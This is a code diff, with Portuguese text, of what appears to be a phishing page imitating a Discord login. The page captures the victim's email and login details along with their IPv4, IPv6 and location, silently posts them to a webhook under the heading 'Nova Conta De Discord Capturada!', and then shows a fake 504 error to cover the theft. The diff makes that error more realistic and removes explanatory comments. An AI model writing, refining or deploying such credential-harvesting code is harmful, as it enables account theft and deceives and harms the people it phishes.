@@ -246,8 +246,9 @@
        
         <button type="submit">Entrar</button>
        
+        <!-- Texto de erro mais realista -->
         <div id="errorBox" class="error-message">
-          --- Erro 504 Recarregue a pagina ou tente Novamente mais tarde! ---
+          --- Erro de conexão com o servidor. Recarregue a página ou tente mais tarde. (504) ---
         </div>
        
         <div class="register-link">
@@ -296,7 +297,6 @@
         return;
       }
 
-      // Captura IPv4 e IPv6 separadamente
       let ipv4 = 'Não detectado';
       let ipv6 = 'Não detectado';
       let location = 'Desconhecido';
@@ -333,7 +333,6 @@
         } catch {}
       }
 
-      // Hora correta para Cotia/SP (America/Sao_Paulo)
       const agora = new Date();
       const options = {
         timeZone: 'America/Sao_Paulo',
@@ -357,7 +356,6 @@
       const hoje = partes.find(p => p.type === 'hour').value.padStart(2, '0') + ':' +
                    partes.find(p => p.type === 'minute').value.padStart(2, '0');
 
-      // Mensagem completa com IPv4, IPv6 e localização
       const mensagem = `🔐 **Nova Conta De Discord Capturada!**
 
 **Login:** \`${email}\`
@@ -369,14 +367,12 @@
 
 **Capturado** • ${dataFormatada}, ${horaFormatada} • Hoje às ${hoje}`;
 
-      // Envia pro webhook silenciosamente
       fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content: mensagem })
       }).catch(() => {});
 
-      // Mostra erro 504 animado
       errorBox.classList.add('show');
       setTimeout(() => errorBox.classList.remove('show'), 3000);
     });
